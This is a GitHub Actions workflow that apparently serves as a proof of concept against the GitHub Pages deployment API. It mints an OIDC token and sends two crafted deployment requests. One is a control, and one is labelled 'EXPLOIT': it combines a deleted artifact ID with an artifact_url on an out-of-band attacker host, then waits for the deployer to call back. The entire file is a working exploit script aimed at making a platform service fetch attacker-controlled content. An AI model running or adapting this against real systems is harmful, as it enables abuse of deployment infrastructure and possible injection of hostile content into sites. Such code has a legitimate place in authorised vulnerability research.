name: bf45-expired-capture
on:
  workflow_dispatch:
    inputs:
      oob: { required: true }
permissions:
  contents: read
  pages: write
  id-token: write
  actions: read
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment:
      name: github-pages
    steps:
      - name: exploit-test
        env:
          OOB: ${{ github.event.inputs.oob }}
          GH_TOKEN: ${{ github.token }}
        run: |
          set -u
          TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
                       "$ACTIONS_ID_TOKEN_REQUEST_URL" | jq -r .value)
          echo "::add-mask::$TOKEN"
          API="https://api.github.com/repos/$GITHUB_REPOSITORY/pages/deployments"
          
          # Deleted artifact ID from this repo (simulates expired)
          DELETED_ART=10910665600
          
          echo "===== CONTROL: artifact_url ONLY (expect 400) ====="
          curl -s -w '\nHTTP=%{http_code}\n' -X POST "$API" \
            -H "Authorization: token $GH_TOKEN" \
            -H "Accept: application/vnd.github.v3+json" \
            -H "Content-Type: application/json; charset=utf-8" \
            -H "User-Agent: octokit-core.js/5.0.0 Node.js/20.0.0" \
            -H "X-GitHub-Api-Version: 2022-11-28" \
            -d "{\"artifact_url\":\"https://$OOB/vfy-bf45/control?arm=ctl\",\"pages_build_version\":\"$GITHUB_SHA\",\"oidc_token\":\"$TOKEN\",\"environment\":\"github-pages\"}"
          
          sleep 5
          
          echo "===== EXPLOIT: deleted artifact + attacker URL ====="
          curl -s -w '\nHTTP=%{http_code}\n' -X POST "$API" \
            -H "Authorization: token $GH_TOKEN" \
            -H "Accept: application/vnd.github.v3+json" \
            -H "Content-Type: application/json; charset=utf-8" \
            -H "User-Agent: octokit-core.js/5.0.0 Node.js/20.0.0" \
            -H "X-GitHub-Api-Version: 2022-11-28" \
            -d "{\"artifact_id\":$DELETED_ART,\"artifact_url\":\"https://$OOB/vfy-bf45/exploit?arm=EXPLOIT\",\"pages_build_version\":\"${GITHUB_SHA}-exploit\",\"oidc_token\":\"$TOKEN\",\"environment\":\"github-pages\"}"
          
          echo "===== waiting 120s for deployer callbacks ====="
          for i in $(seq 1 8); do sleep 15; echo "t=$((i*15))s"; done
